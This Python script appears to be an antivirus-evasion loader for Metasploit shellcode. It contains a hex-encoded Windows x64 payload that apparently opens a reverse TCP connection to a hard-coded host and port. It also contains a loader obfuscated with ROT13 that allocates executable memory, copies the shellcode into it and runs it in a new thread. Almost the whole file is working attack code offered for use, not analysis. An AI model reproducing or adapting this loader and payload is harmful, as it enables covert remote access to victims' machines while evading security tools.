# -*- coding: utf-8 -*-
# @Time    : 16 2月 2025 7:56 下午
# @Author  : codervibe
# @File    : 逍遥子大表哥msf免杀.py
# @Project : pythonBasics
import ctypes
import base64


shellcode = 'fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220488b72504d31c9480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0508b4818448b40204901d0e3564d31c948ffc9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc020015b3c0a87b2b41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5'
shellcode = bytes.fromhex(shellcode)


def rot13(message):
    res = ''
    for item in message:
        if (ord(item) >= ord('A') and ord(item) <= ord('M')) or (ord(item) >= ord('a') and ord(item) <= ord('m')):
            res += chr(ord(item) + 13)
        elif (ord(item) >= ord('N') and ord(item) <= ord('Z')) or (ord(item) >= ord('n') and ord(item) <= ord('z')):
            res += chr(ord(item) - 13)
        else:
            res += item
    return res


loader = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(furyypbqr), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(furyypbqr), yra(furyypbqr));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"
print(rot13(loader))
